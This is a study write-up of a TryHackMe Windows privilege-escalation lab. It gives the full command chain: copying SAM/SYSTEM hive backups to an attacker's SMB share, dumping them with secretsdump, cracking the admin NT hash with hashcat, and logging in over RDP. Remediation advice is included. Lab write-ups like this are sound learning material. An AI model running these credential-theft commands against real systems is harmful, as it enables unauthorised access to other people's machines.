# Windows PrivEsc — Dumping the SAM (TryHackMe, Task 11)

This is a writeup of the SAM attack from the TryHackMe **Windows PrivEsc** room (the Tib3rius one). I'm studying for the PNPT and I redid this lab to understand it properly instead of just copying commands. If you're on the same path, I highly recommend this room — it covers the Windows privilege-escalation techniques you'll actually use.

Everything here is a public practice box and generic methodology. Nothing about the real PNPT exam — that's under NDA.

## Summary

- **Box:** TryHackMe — Windows PrivEsc room, Task 11 (Security Account Manager / SAM)
- **Start:** low-privilege `user` account
- **End:** admin access
- **The chain:** grab the SAM + SYSTEM files → copy them to Kali → dump the hashes → crack the admin hash → log in as admin

## What the SAM actually is

The **SAM** (Security Account Manager) is the file where Windows stores every local account's password — but as a **hash**, not plaintext. A hash is one-way: it's used to *check* a login, not to read the password back.

Here's the catch, and it's the whole point of this attack: **you need two files, not one.**

- **SAM** = the hashes (locked up)
- **SYSTEM** = the key that decrypts them

You can't use one without the other. The SAM holds the hashes, but SYSTEM is the key to break into it. Once you have both on your own machine, you crack the hashes **offline** with hashcat or John the Ripper — no limit on tries, no lockout, because you're not touching the target anymore.

## Enumeration

First, confirm what access I have. I opened `cmd` on the Windows box and checked my level:

```cmd
whoami
```

It returned `win-...\user` — a low-level user account. No admin.

The live SAM and SYSTEM files sit in `C:\Windows\System32\config\`, but you **can't copy them while Windows is running** — they're held open by the system. If you try to open one, you get *"the process cannot access the file because it is being used by another process."*

The way in: this box keeps **backup copies** of SAM and SYSTEM in `C:\Windows\Repair\`. Those backups aren't locked, so you can grab them. Storing readable backups of the hives there is a **misconfiguration by the admin** — in the real world it shouldn't be left like that.

## Exploitation

### 1. Start an SMB server on Kali (to receive the files)

I need to pull the files off Windows onto my Kali attacker machine. Modern Windows blocks anonymous file shares, so the share needs a username and password — this is the part that trips people up with the newer Windows security.

```bash
smbserver.py share . -smb2support -user red -password red
```

- `share` = the share name (I'll use this exact name on the Windows side)
- `.` = share the current folder (where files will land)
- `-smb2support` = needed so modern Windows will connect
- `-user red -password red` = the credentials the Windows side must use

### 2. Connect and copy the files (on Windows)

```cmd
net use \\KALI_IP\share /user:red red
copy C:\Windows\Repair\SAM \\KALI_IP\share\
copy C:\Windows\Repair\SYSTEM \\KALI_IP\share\
```

- `net use` authenticates to the share first (this clears the "anonymous access blocked" wall)
- then `copy` pushes each file to the share
- the files appear in the folder on Kali — I confirmed with `ls`

### 3. Dump the hashes (on Kali)

With both files on Kali, combine them to extract the hashes:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

- `-sam SAM` = the SAM file (the hashes)
- `-system SYSTEM` = the SYSTEM file (the key)
- `LOCAL` = read them as local files

The output is one line per account: `username:RID:LMhash:NThash:::`. The long hex string in the 4th field is the **NT hash** — that's what you crack.

### 4. Crack the admin hash (on Kali)

```bash
hashcat -m 1000 <NThash> /usr/share/wordlists/rockyou.txt
```

- `-m 1000` = NTLM mode. **Feed only the NT hash** (the 4th field). The `aad3b435...` LM part is dead — don't include it, or you get a "token length exception"
- `rockyou.txt` = a huge list of leaked real-world passwords; hashcat hashes each word and compares until one matches

It cracked the admin account's hash to `password123`.

### 5. Log in as admin

```bash
xfreerdp /u:admin /p:password123 /cert:ignore /v:TARGET_IP
```

Logged in as admin — the compromise is proven. Done: **low-priv user → SYSTEM-level secrets → admin.**

## Mistakes I made (so you can skip them)

I hit every one of these redoing the lab. Writing them down so you don't lose the time I did:

1. **`xfreerdp` flag with a space** — I wrote `/ cert:ignore` (space after the slash) and got `Invalid sigil`. Flags are `/flag`, joined, no space: `/cert:ignore`.
2. **Share name mismatch** — I started the server as `share` but tried to `copy` to `\\KALI\kali\`. Windows couldn't find a share called "kali" (the SMB log said `SMB2_TREE_CONNECT not found kali`). The name must match on both sides.
3. **Wrong IP in the copy** — I put the *Windows* IP in the copy destination instead of my *Kali* IP. The destination is always the machine receiving the file (Kali).
4. **Trying to install smbserver** — `smbserver.py` is already on Kali. When it "failed," the real problem was the share name, not a missing package. Don't `apt install` it.
5. **hashcat showed nothing** — if you already cracked a hash before, hashcat remembers it in its *potfile* and won't re-crack it. Use `--show` to see the stored result: `hashcat -m 1000 <hash> --show`.
6. **`wordlist` vs `wordlists`** — the path is `/usr/share/wordlists/rockyou.txt`, with an **s**. A fresh crack silently fails without it.

None of these are "stupid" — they're the small details you miss under a dozen moving parts. The skill isn't never slipping; it's reading the error and fixing it fast.

## Impact

Any user who can read the SAM/SYSTEM backups can dump every local hash and crack them offline. Because one of the accounts is an admin, this takes a low-privilege user straight to **full local administrator**. If that password is reused anywhere else on the network, it spreads further (lateral movement).

## Remediation

- Don't leave readable backups of the registry hives in `C:\Windows\Repair\` (or anywhere a normal user can reach).
- Use strong, unique local admin passwords — **LAPS** does this automatically so the same password isn't reused across machines.
- Enable **Credential Guard** to make credential theft harder.
- Restrict which users can log in locally / via RDP.
